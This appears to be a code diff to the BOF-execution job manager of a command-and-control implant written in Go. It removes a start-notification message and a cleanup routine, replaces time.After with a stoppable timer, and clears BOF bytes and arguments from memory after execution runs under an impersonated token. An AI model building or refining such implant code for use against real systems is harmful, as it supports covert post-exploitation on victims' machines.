@@ -256,9 +256,6 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 	statusKilled := bofStatusKilled()
 	statusTimeout := bofStatusTimeout()
 	statusRunning := bofStatusRunning()
-	asyncStarted := bofAsyncStarted()
-	pipeSep := bofPipeSep()
-	cmdAsyncStatus := bofCmdAsyncStatus()
 
 	defer func() {
 		if r := recover(); r != nil {
@@ -275,22 +272,6 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 			job.OutputMutex.Unlock()
 		}
 	}()
-
-	// Send start notification through OutputManager
-	startMsg := asyncStarted + pipeSep + job.ID + pipeSep + job.Name
-	startResult := &OpResult{
-		Cmd: Msg{
-			Cmd:     cmdAsyncStatus,
-			CID:   job.CID,
-			DID: job.DID,
-			AID:     job.AID,
-		},
-		Output:      startMsg,
-		EC:    0,
-		Done: time.Now().Format(time.RFC3339),
-		JobID:       job.ID,
-	}
-	resultManager.addResult(startResult)
 
 	// Create channels for coordination
 	bofDone := make(chan struct{})
@@ -471,6 +452,9 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 		// IMPORTANT: The impersonation must be active during this call
 		output, err := LoadWithTimeout(job.BOFBytes, job.Args, 30*time.Minute)
 
+		job.BOFBytes = nil
+		job.Args = nil
+
 		// Revert impersonation AFTER BOF execution completes
 		if duplicatedTokenHandle != 0 {
 			RevertToSelf()
@@ -484,6 +468,9 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 	}()
 
 	// Wait for completion, cancellation, or timeout
+	timeout := time.NewTimer(30 * time.Minute)
+	defer timeout.Stop()
+
 	select {
 	case result := <-resultChan:
 		// Wait for output monitor to finish
@@ -529,7 +516,7 @@ func (bjm *WorkManager) executeBOFAsync(job *WorkItem) {
 		// Queue final chunk through OutputManager
 		bjm.queueOutputChunk(job, finalOutput, true)
 
-	case <-time.After(30 * time.Minute):
+	case <-timeout.C:
 		closeBofDone.Do(func() { close(bofDone) })
 		<-outputDone
 
@@ -856,14 +843,3 @@ func (bjm *WorkManager) getJob(jobID string) (*WorkItem, bool) {
 	return job, exists
 }
 
-// Initialize cleanup routine
-func init() {
-	go func() {
-		ticker := time.NewTicker(1 * time.Hour)
-		defer ticker.Stop()
-
-		for range ticker.C {
-			bofJobManager.cleanupOldJobs(24 * time.Hour)
-		}
-	}()
-}
